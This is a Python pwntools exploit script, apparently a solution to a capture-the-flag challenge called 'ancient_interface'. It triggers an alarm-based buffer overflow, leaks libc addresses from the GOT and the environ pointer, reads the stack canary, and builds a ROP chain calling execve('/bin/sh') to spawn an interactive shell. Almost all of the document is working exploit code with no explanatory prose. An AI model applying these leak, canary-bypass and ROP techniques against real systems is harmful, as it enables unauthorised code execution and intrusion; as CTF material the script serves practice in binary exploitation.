import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
handle SIGALRM pass
b *0x004019a6
b *0x00401a38
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'challenge' / 'ancient_interface'

if args.REMOTE:
    libc_path = parent_dir / 'challenge' / 'libc6_2.31-0ubuntu9.12_amd64.so'
else:
    libc_path = Path('/usr/lib/x86_64-linux-gnu/libc.so.6')

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)
elf.arch = 'amd64'
libc.arch = 'amd64'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)


def overflow(overflow_data: bytes) -> None:
    data_size = len(overflow_data)
    alarm = int(data_size * 0.1) + 1
    for i in range(data_size):
        io.sendlineafter(b'user@host$ ', f'alarm {alarm}'.encode())
        sleep(0.1)

    io.sendlineafter(b'user@host$ ', b'read 2 a')

    for i in range(data_size):
        io.recvuntil(b'Alarm has been hit!\n')

    io.send(overflow_data)


count_leaks = 0


def leak_data(address: int) -> bytes:
    global count_leaks

    if count_leaks == 50:
        error(f'Cannot leak data more than 50 times!')

    info(f'Leaking data at address {hex(address)}')

    overflow(p64(address))
    io.sendline(b'\x00' * 0x6)
    io.recvuntil(b'user@host$ : command not found\n')

    io.sendlineafter(b'user@host$ ', b'vars')

    # Skip previous leaks
    for i in range(count_leaks):
        info(list(map(hex, io.recvuntil(b'\n', drop=True))))

    # Get new leak
    leaked_data = io.recvuntil(b'\n', drop=True)
    info(f'Leaked data: {list(map(hex, leaked_data))}')
    count_leaks += 1
    return leaked_data


def trigger_rop(rop_chain: bytes,
                canary: int) -> None:
    return_address = u64(rop_chain[0:8])
    rop_chain = rop_chain[8:]
    info(f'Overwriting return address with {hex(return_address)}')

    overwrite_rbp = 0xAAAAAAAA
    return_ptr_payload = b''.join((0x1000 * b'a',
                                   b'bbbbbbbb',
                                   p64(canary),
                                   p64(overwrite_rbp),
                                   p64(return_address),
                                   rop_chain))

    new_read_size = len(return_ptr_payload)
    read_size_payload = p32(new_read_size) + p64(0x402132)
    overflow(read_size_payload)

    input('Press any key to continue...')
    io.sendline(return_ptr_payload)


info('Leaking address of libc sigaction method...')
got_sigaction_addr = elf.got.sigaction - 0x1
libc_sigaction_leaked_data = leak_data(got_sigaction_addr)
if len(libc_sigaction_leaked_data) != 6:
    error(f'Failed to leak address of libc `sigaction` in GOT')

libc_sigaction_addr = u64(libc_sigaction_leaked_data.ljust(8, b'\x00'))
success(f'Leaked libc sigaction address: {hex(libc_sigaction_addr)}')


info('Leaking address of libc printf method...')
got_printf_addr = elf.got.printf - 0x1
libc_printf_leaked_data = leak_data(got_printf_addr)
if len(libc_printf_leaked_data) != 6:
    error(f'Failed to leak address of libc `printf` in GOT')

libc_printf_addr = u64(libc_printf_leaked_data.ljust(8, b'\x00'))
success(f'Leaked libc printf address: {hex(libc_printf_addr)}')


info('Leaking address of libc write method...')
got_write_addr = elf.got.write - 0x1
libc_write_leaked_data = leak_data(got_write_addr)
if len(libc_write_leaked_data) != 6:
    error(f'Failed to leak address of libc `write` in GOT')

libc_write_addr = u64(libc_write_leaked_data.ljust(8, b'\x00'))
success(f'Leaked libc write address: {hex(libc_write_addr)}')

info('Leaking address of libc read method...')
got_read_addr = elf.got.read - 0x1
libc_read_leaked_data = leak_data(got_read_addr)
if len(libc_read_leaked_data) != 6:
    error(f'Failed to leak address of libc `read` in GOT')

libc_read_addr = u64(libc_read_leaked_data.ljust(8, b'\x00'))
success(f'Leaked libc read address: {hex(libc_read_addr)}')
libc.address = libc_read_addr - libc.sym.read
success(f'Derived libc base address: {hex(libc.address)}')

info('Leaking address of environment pointer stack address...')
libc_environ_addr = libc.sym.environ - 0x1
libc_environ_leaked_data = leak_data(libc_environ_addr)
if len(libc_environ_leaked_data) != 6:
    error(f'Failed to leak address of libc `environ`')

libc_environ_ptr_addr = u64(libc_environ_leaked_data.ljust(8, b'\x00'))
success(f'Leaked environment pointer stack address: {hex(libc_environ_ptr_addr)}')

canary_stack_offset = -0x110 if args.REMOTE else -0x90
canary_stack_addr = libc_environ_ptr_addr + canary_stack_offset
success(f'Address of canary: {hex(canary_stack_addr)}')

info('Leaking stack canary...')
stack_canary_leaked_data = leak_data(canary_stack_addr)
if len(stack_canary_leaked_data) != 7:
    error(f'Failed to leak the stack canary')

stack_canary = u64(stack_canary_leaked_data.rjust(8, b'\x00'))
success(f'Leaked stack canary : {hex(stack_canary)}')

info('Pwning via ROP...')
rop_stack_offset = -0x1140 if args.REMOTE else -0x1160
rop_stack_addr = libc_environ_ptr_addr + rop_stack_offset
execve_rop = rop.ROP(libc, base=rop_stack_addr)
execve_rop.call('execve', [b'/bin/sh', 0x0, 0x0])
trigger_rop(execve_rop.chain(), stack_canary)

success('Your shell, m\'lord:')
io.interactive()
